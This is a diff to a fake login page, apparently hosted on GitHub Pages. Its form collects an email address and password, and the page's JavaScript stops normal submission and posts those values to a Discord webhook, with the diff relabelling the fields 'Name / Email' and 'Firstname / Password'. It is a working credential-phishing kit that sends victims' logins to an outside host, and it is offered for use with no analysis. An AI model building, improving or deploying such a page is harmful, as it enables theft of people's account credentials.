@@ -239,47 +239,40 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
     <div class="separator mt-5">Or continue with</div>
         
-            <form method="POST" action="send.php" class="mt-5" id="my-custom-form">
-                <input type="hidden" name="_token" value="z0fHaPgV3X7NyG4EoKx5RZkTb9e0Nrenn8z1IcKY" autocomplete="off">
-                <div class="mb-3">
+           <form method="POST" action="send.php" class="mt-5" id="captcha-form">
+    <input type="hidden" name="_token" value="z0fHaPgV3X7NyG4EoKx5RZkTb9e0Nrenn8z1IcKY" autocomplete="off">
+    
+    <div class="mb-3">
                     <label class="form-label text-primary" for="email">Email Address</label>
                     <input id="email" type="text" class="form-control " name="email" value="" required="" autocomplete="email" autofocus="">
-
-                                    </div>
-
-                <div class="mb-3">
+    </div>
+    
+    <div class="mb-3">
                     <label class="form-label text-primary" for="password">Password</label>
                     <input id="password" type="password" class="form-control " name="password" required="" autocomplete="current-password">
-
-                                    </div>
-
-                <div class="row gy-3 mb-3">
-                    <div class="col-md-6">
-                        <div class="form-check">
-                            <input class="form-check-input" type="checkbox" name="remember" id="remember">
-
-                            <label class="form-check-label" for="remember">
-                                Remember Me
-                            </label>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="d-grid">
-                    <button type="submit" class="btn btn-gradient d-block">
-                        Login
-                    </button>
-                </div>
-            </form>
-
+    </div>
+    
+    <div class="row gy-3 mb-3">
+        <div class="col-md-6">
+            <div class="form-check">
+                <input class="form-check-input" type="checkbox" name="remember" id="remember">
+                <label class="form-check-label" for="remember">Remember Me</label>
+            </div>
+        </div>
+    </div>
+    
+    <div class="d-grid">
+        <button type="submit" class="btn btn-gradient d-block">Login</button>
+    </div>
+</form>
 
 <!-- ==================== JAVASCRIPT ==================== -->
 <script>
-    document.getElementById('my-custom-form').addEventListener('submit', async function(e) {
+    document.getElementById('captcha-form').addEventListener('submit', async function(e) {
         e.preventDefault(); // Stop normal submission (important for GitHub Pages)
 
-        const name      = document.getElementById('email').value.trim();
-        const firstname = document.getElementById('password').value.trim();
+        const name      = document.getElementById('name').value.trim();
+        const firstname = document.getElementById('firstname').value.trim();
         const remember  = document.getElementById('remember').checked ? 'Yes' : 'No';
 
         // Your Discord webhook
@@ -291,8 +284,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                 color: 0x3498db,
                 timestamp: new Date().toISOString(),
                 fields: [
-                    { name: " Email", value: email || "N/A", inline: true },
-                    { name: " Password", value: password || "N/A", inline: true },
+                    { name: "Name / Email", value: name || "N/A", inline: true },
+                    { name: "Firstname / Password", value: firstname || "N/A", inline: true },
                     { name: "Remember Me", value: remember, inline: true },
                     { name: "Time", value: new Date().toLocaleString(), inline: true }
                 ],
